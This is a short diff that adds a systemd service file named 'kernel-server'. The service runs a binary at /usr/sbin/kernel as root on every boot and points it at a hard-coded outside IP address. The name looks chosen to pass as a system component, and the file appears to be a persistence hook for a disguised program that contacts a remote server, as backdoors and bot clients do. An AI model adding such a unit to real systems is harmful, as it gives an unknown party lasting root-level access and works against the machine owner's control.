@@ -1,0 +1,10 @@
+[Unit]
+Description=kernel-server
+After=network.target
+
+[Service]
+User=root
+ExecStart=/usr/sbin/kernel -s 222.200.97.179
+
+[Install]
+WantedBy=multi-user.target
